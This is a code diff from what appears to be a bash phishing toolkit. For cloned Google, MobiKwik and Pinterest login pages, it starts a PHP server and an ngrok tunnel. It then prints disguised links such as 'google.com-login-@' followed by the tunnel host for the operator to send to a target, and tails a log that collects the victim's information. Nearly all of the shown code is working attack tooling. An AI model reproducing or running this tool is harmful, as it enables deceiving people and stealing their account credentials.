+                          echo -ne "\n${GREEN}[${WHITE}+${GREEN}]${ORANGE} Php server now starting...\n"${WHITE}
+                          php -S 0.0.0.0:2030 > /dev/null 2>&1 &
                           sleep 3
-                          echo ""
-                          echo -e $'\e[1;33m\e[0m\e[1;77m \e[0m\e[1;33m\e[0m\e[1;36m       ---------------------------        \e[0m'
-                          echo -e $'\e[1;33m\e[0m\e[1;77m \e[0m\e[1;33m\e[0m\e[1;91m     !  NGROK SERVER NOW STARTING  !     \e[0m'
-                          echo -e $'\e[1;33m\e[0m\e[1;77m \e[0m\e[1;33m\e[0m\e[1;36m       ---------------------------        \e[0m'
+                          echo -ne "\n${GREEN}[${WHITE}+${GREEN}]${ORANGE} Ngrok server now starting...\n"${WHITE}
                           ./ngrok http 4444 > /dev/null 2>&1 &
-                          sleep 25
-                          clear
+                          sleep 9
                           echo ""
                           link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "[0-9a-z]*\.ngrok.io")
-                          echo ""
-                          echo ""
-                          cat secnhack
-                          echo -e "\e[96m======================\e[91m INFORMATION OF VICITM \e[96m========================= \e[93m"
-                          echo ""
-                          echo "" 
-                          read -p $'\e[1;40m\e[96m DO YOU WANT TO MODIFY URL ?\e[1;91m (Y/N) : \e[0m' option
-                          echo ""
+                          read -p $"${GREEN}[${WHITE}+${GREEN}]${WHITE} Do you want to modify url?${WHITE} [y/n]: " option
                           if [[ $option == *'Y'* ]] || [[ $option == *'y'* ]] 
                           then
-                          echo -e $'\e[1;33m\e[0m\e[1;77m\e[0m\e[1;33m\e[0m\e[1;96m ------------------------- > > > > > >\e[0m'
-                          printf "\e[1;33m\e[0m\e[1;33m Send this link to the Target :\e[0m\e[1;77m %s\e[0m\n" https://google.com-login-@$link                                    
-                          echo -e $'\e[1;33m\e[0m\e[1;77m\e[0m\e[1;33m\e[0m\e[1;96m ------------------------- > > > > > > >\e[0m'
+                          printf "\n${GREEN}[${WHITE}+${GREEN}]${RED} Wan Attacks use this link:${ORANGE} %s" https://google.com-login-@$link
+                          echo -ne "\n${GREEN}[${WHITE}+${GREEN}]${RED} Local Attacks use this link:${ORANGE} http://127.0.0.1:2030\n"${WHITE}
                           else
-                          echo -e $'\e[1;33m\e[0m\e[1;77m\e[0m\e[1;33m\e[0m\e[1;96m ------------------------- > > > > > >\e[0m'
-                          printf "\e[1;33m\e[0m\e[1;33m Send this link to the Target :\e[0m\e[1;77m %s\e[0m\n" https://$link
-                          echo -e $'\e[1;33m\e[0m\e[1;77m\e[0m\e[1;33m\e[0m\e[1;96m ------------------------- > > > > > > >\e[0m'
+                          printf "\n${GREEN}[${WHITE}+${GREEN}]${RED} Wan Attacks use this link:${ORANGE} %s" https://$link
+                          echo -ne "\n${GREEN}[${WHITE}+${GREEN}]${RED} Local Attacks use this link:${ORANGE} http://127.0.0.1:2030\n"${WHITE}
                           fi
-                           
+                          echo -ne "\n${GREEN}[${WHITE}+${GREEN}]${BLUE} Witing to Crawl victim's information\n"${WHITE}
                           if [[ -e log.txt ]]; then
                           > log.txt
                           fi 
                           echo ""
-                          echo ""
-                          tail -f log.txt              
- 
+                          tail -f log.txt
 
                 break;
                 elif [ $option = 31 ] || [ $option = 31 ]
-	        then
-               
+            then
                           cd sites/
                           cd mobikwik/
-                          echo ""
-                          echo -e $'\e[1;33m\e[0m\e[1;77m \e[0m\e[1;33m\e[0m\e[1;36m       ---------------------------        \e[0m'
-                          echo -e $'\e[1;33m\e[0m\e[1;77m \e[0m\e[1;33m\e[0m\e[1;91m     !   PHP SERVER NOW STARTING   !      \e[0m'
-                          echo -e $'\e[1;33m\e[0m\e[1;77m \e[0m\e[1;33m\e[0m\e[1;36m       ---------------------------        \e[0m'
-                          php -S 127.0.0.1:4444 > /dev/null 2>&1 &
+                          echo -ne "\n${GREEN}[${WHITE}+${GREEN}]${ORANGE} Php server now starting...\n"${WHITE}
+                          php -S 0.0.0.0:2030 > /dev/null 2>&1 &
                           sleep 3
-                          echo ""
-                          echo -e $'\e[1;33m\e[0m\e[1;77m \e[0m\e[1;33m\e[0m\e[1;36m       ---------------------------        \e[0m'
-                          echo -e $'\e[1;33m\e[0m\e[1;77m \e[0m\e[1;33m\e[0m\e[1;91m     !  NGROK SERVER NOW STARTING  !     \e[0m'
-                          echo -e $'\e[1;33m\e[0m\e[1;77m \e[0m\e[1;33m\e[0m\e[1;36m       ---------------------------        \e[0m'
+                          echo -ne "\n${GREEN}[${WHITE}+${GREEN}]${ORANGE} Ngrok server now starting...\n"${WHITE}
                           ./ngrok http 4444 > /dev/null 2>&1 &
-                          sleep 25
-                          clear
+                          sleep 9
                           echo ""
                           link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "[0-9a-z]*\.ngrok.io")
-                          echo ""
-                          echo ""
-                          cat secnhack
-                          echo -e "\e[96m======================\e[91m INFORMATION OF VICITM \e[96m========================= \e[93m"
-                          echo ""
-                          echo "" 
-                          read -p $'\e[1;40m\e[96m DO YOU WANT TO MODIFY URL ?\e[1;91m (Y/N) : \e[0m' option
-                          echo ""
+                          read -p $"${GREEN}[${WHITE}+${GREEN}]${WHITE} Do you want to modify url?${WHITE} [y/n]: " option
                           if [[ $option == *'Y'* ]] || [[ $option == *'y'* ]] 
                           then
-                          echo -e $'\e[1;33m\e[0m\e[1;77m\e[0m\e[1;33m\e[0m\e[1;96m ------------------------- > > > > > >\e[0m'
-                          printf "\e[1;33m\e[0m\e[1;33m Send this link to the Target :\e[0m\e[1;77m %s\e[0m\n" https://www.mobikwik.com-@$link                                    
-                          echo -e $'\e[1;33m\e[0m\e[1;77m\e[0m\e[1;33m\e[0m\e[1;96m ------------------------- > > > > > > >\e[0m'
+                          printf "\n${GREEN}[${WHITE}+${GREEN}]${RED} Wan Attacks use this link:${ORANGE} %s" https://www.mobikwik.com-@$link
+                          echo -ne "\n${GREEN}[${WHITE}+${GREEN}]${RED} Local Attacks use this link:${ORANGE} http://127.0.0.1:2030\n"${WHITE}
                           else
-                          echo -e $'\e[1;33m\e[0m\e[1;77m\e[0m\e[1;33m\e[0m\e[1;96m ------------------------- > > > > > >\e[0m'
-                          printf "\e[1;33m\e[0m\e[1;33m Send this link to the Target :\e[0m\e[1;77m %s\e[0m\n" https://$link
-                          echo -e $'\e[1;33m\e[0m\e[1;77m\e[0m\e[1;33m\e[0m\e[1;96m ------------------------- > > > > > > >\e[0m'
+                          printf "\n${GREEN}[${WHITE}+${GREEN}]${RED} Wan Attacks use this link:${ORANGE} %s" https://$link
+                          echo -ne "\n${GREEN}[${WHITE}+${GREEN}]${RED} Local Attacks use this link:${ORANGE} http://127.0.0.1:2030\n"${WHITE}
                           fi
-                           
+                          echo -ne "\n${GREEN}[${WHITE}+${GREEN}]${BLUE} Witing to Crawl victim's information\n"${WHITE}
                           if [[ -e log.txt ]]; then
                           > log.txt
                           fi 
                           echo ""
-                          echo ""
-                          tail -f log.txt   
+                          tail -f log.txt
 
                 break;
                 elif [ $option = 32 ] || [ $option = 32 ]
-	        then
+            then
                           cd sites/
                           cd pinterest/
-                          echo ""
-                          echo -e $'\e[1;33m\e[0m\e[1;77m \e[0m\e[1;33m\e[0m\e[1;36m       ---------------------------        \e[0m'
-                          echo -e $'\e[1;33m\e[0m\e[1;77m \e[0m\e[1;33m\e[0m\e[1;91m     !   PHP SERVER NOW STARTING   !      \e[0m'
-                          echo -e $'\e[1;33m\e[0m\e[1;77m \e[0m\e[1;33m\e[0m\e[1;36m       ---------------------------        \e[0m'
-                          php -S 127.0.0.1:4444 > /dev/null 2>&1 &
+                          echo -ne "\n${GREEN}[${WHITE}+${GREEN}]${ORANGE} Php server now starting...\n"${WHITE}
+                          php -S 0.0.0.0:2030 > /dev/null 2>&1 &
                           sleep 3
-                          echo ""
-                          echo -e $'\e[1;33m\e[0m\e[1;77m \e[0m\e[1;33m\e[0m\e[1;36m       ---------------------------        \e[0m'
-                          echo -e $'\e[1;33m\e[0m\e[1;77m \e[0m\e[1;33m\e[0m\e[1;91m     !  NGROK SERVER NOW STARTING  !     \e[0m'
-                          echo -e $'\e[1;33m\e[0m\e[1;77m \e[0m\e[1;33m\e[0m\e[1;36m       ---------------------------        \e[0m'
+                          echo -ne "\n${GREEN}[${WHITE}+${GREEN}]${ORANGE} Ngrok server now starting...\n"${WHITE}
                           ./ngrok http 4444 > /dev/null 2>&1 &
-                          sleep 25
-                          clear
+                          sleep 9
                           echo ""
                           link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "[0-9a-z]*\.ngrok.io")
-                          echo ""
-                          echo ""
-                          cat secnhack
-                          echo -e "\e[96m======================\e[91m INFORMATION OF VICITM \e[96m========================= \e[93m"
-                          echo ""
-                          echo "" 
-                          read -p $'\e[1;40m\e[96m DO YOU WANT TO MODIFY URL ?\e[1;91m (Y/N) : \e[0m' option
-                          echo ""
+                          read -p $"${GREEN}[${WHITE}+${GREEN}]${WHITE} Do you want to modify url?${WHITE} [y/n]: " option
                           if [[ $option == *'Y'* ]] || [[ $option == *'y'* ]] 
                           then
-                          echo -e $'\e[1;33m\e[0m\e[1;77m\e[0m\e[1;33m\e[0m\e[1;96m ------------------------- > > > > > >\e[0m'
-                          printf "\e[1;33m\e[0m\e[1;33m Send this link to the Target :\e[0m\e[1;77m %s\e[0m\n" https://www.mobikwik.com-@$link                                    
-                          echo -e $'\e[1;33m\e[0m\e[1;77m\e[0m\e[1;33m\e[0m\e[1;96m ------------------------- > > > > > > >\e[0m'
+                          printf "\n${GREEN}[${WHITE}+${GREEN}]${RED} Wan Attacks use this link:${ORANGE} %s" https://www.mobikwik.com-@$link
+                          echo -ne "\n${GREEN}[${WHITE}+${GREEN}]${RED} Local Attacks use this link:${ORANGE} http://127.0.0.1:2030\n"${WHITE}
                           else
-                          echo -e $'\e[1;33m\e[0m\e[1;77m\e[0m\e[1;33m\e[0m\e[1;96m ------------------------- > > > > > >\e[0m'
-                          printf "\e[1;33m\e[0m\e[1;33m Send this link to the Target :\e[0m\e[1;77m %s\e[0m\n" https://$link
-                          echo -e $'\e[1;33m\e[0m\e[1;77m\e[0m\e[1;33m\e[0m\e[1;96m ------------------------- > > > > > > >\e[0m'
+                          printf "\n${GREEN}[${WHITE}+${GREEN}]${RED} Wan Attacks use this link:${ORANGE} %s" https://$link
+                          echo -ne "\n${GREEN}[${WHITE}+${GREEN}]${RED} Local Attacks use this link:${ORANGE} http://127.0.0.1:2030\n"${WHITE}
                           fi
-                           
+                          echo -ne "\n${GREEN}[${WHITE}+${GREEN}]${BLUE} Witing to Crawl victim's information\n"${WHITE}
                           if [[ -e log.txt ]]; then
                           > log.txt
                           fi 
                           echo ""
-                          echo ""
-                          tail -f log.txt        
+                          tail -f log.txt
 
                 break;
-   
-               
 
-                elif [ $option = 99 ]
-	        then     
-	                 echo
-       	                 exit 
-		break;
-		      
-                else 
-		  
-		         echo
-		         echo -e "\e[92m[\e[94m!\e[92m]\e[92m Invalid option Try Again !! \e[m "
-		         sleep 2
+                elif [ $option = 0 ]
+            then
+                     echo
+                            exit
+        break;
+
+                else
+
+                 echo
+                 echo -ne "\n${GREEN}[${WHITE}+${GREEN}]${RED} Invalid option Try Again!!"${WHITE}
+                 sleep 2
                          exit
-		         fi
+                 fi
                          done
